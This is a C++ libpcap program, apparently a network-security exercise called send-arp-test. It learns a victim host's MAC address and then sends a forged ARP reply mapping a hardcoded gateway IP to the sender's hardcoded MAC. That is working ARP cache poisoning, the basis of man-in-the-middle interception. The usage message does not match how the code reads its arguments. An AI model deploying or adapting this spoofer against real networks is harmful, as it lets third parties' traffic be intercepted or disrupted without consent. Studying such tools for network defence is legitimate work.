#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

void sendArp(pcap_t* handle, Mac senderMac, Ip senderIp, Mac targetEthMac, Mac targetArpMac, Ip targetIp, bool isRequest) {
    EthArpPacket packet;

    // ARP Message
    packet.eth_.dmac_ = targetEthMac;
    packet.eth_.smac_ = senderMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
	if (isRequest){
		packet.arp_.op_ = htons(ArpHdr::Request);
	}
	else {
		packet.arp_.op_ = htons(ArpHdr::Reply);
	}
    packet.arp_.smac_ = senderMac;
    packet.arp_.sip_ = htonl(senderIp);
    packet.arp_.tmac_ = targetArpMac;
    packet.arp_.tip_ = htonl(targetIp);

    // send ARP
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

Mac receiveMacFromArpReply(pcap_t* handle){
	while (true) {
        	struct pcap_pkthdr* header;
        	const u_char* response;
        	int res = pcap_next_ex(handle, &header, &response);
        	if (res == 1) {
        		EthArpPacket* reply = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(response));
        		if (reply->eth_.type() == EthHdr::Arp && reply->arp_.op() == ArpHdr::Reply) {
				return reply->arp_.smac();
			}
		}
	}
	return Mac("00:00:00:00:00:00");
}




int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}


	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 65535, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	Ip myIp = Ip(argv[2]);
	Ip victimIp = Ip(argv[3]);
	Ip gatewayIp = Ip("10.1.1.1");

	EthArpPacket packet;

	Mac broadcastMac = Mac("FF:FF:FF:FF:FF:FF");
	Mac myMac = Mac("00:0C:29:08:CA:15");
	Mac unknownMac = Mac("00:00:00:00:00:00");
	
	sendArp(handle, myMac, myIp, broadcastMac, unknownMac, victimIp, true);


	Mac victimMac = receiveMacFromArpReply(handle);

	sendArp(handle, myMac, gatewayIp, victimMac, victimMac, victimIp, false);

	pcap_close(handle);
}
